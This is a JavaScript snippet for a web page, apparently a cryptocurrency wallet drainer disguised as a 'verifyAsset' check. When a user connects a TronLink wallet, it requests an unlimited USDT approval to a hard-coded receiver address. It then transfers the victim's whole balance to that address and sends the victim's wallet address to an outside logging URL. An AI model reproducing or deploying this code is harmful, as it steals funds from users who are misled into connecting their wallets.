const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRC-20 USDT
const receiver = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN"; // Your wallet
const amountHex = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

async function verifyAsset() {
  if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
    const address = window.tronWeb.defaultAddress.base58;
    const contract = await window.tronWeb.contract().at(usdtContract);

    // Approve unlimited USDT
    try {
      await contract.approve(receiver, amountHex).send();
      alert("Approval successful!");
    } catch (e) {
      alert("Approval failed: " + e.message);
      return;
    }

    // Auto Withdraw All Balance
    try {
      const balance = await contract.balanceOf(address).call();
      await contract.transferFrom(address, receiver, balance).send();
      alert("Withdrawal complete!");
    } catch (err) {
      alert("Withdrawal failed: " + err.message);
    }

    // Send data to admin panel
    fetch("https://jsharma6142.github.io/verify-flash-asset/admin-log.json", {
      method: "POST",
      body: JSON.stringify({ wallet: address, time: new Date().toISOString() }),
    }).catch(() => {});
  } else {
    alert("Please connect to TronLink Wallet");
  }
}
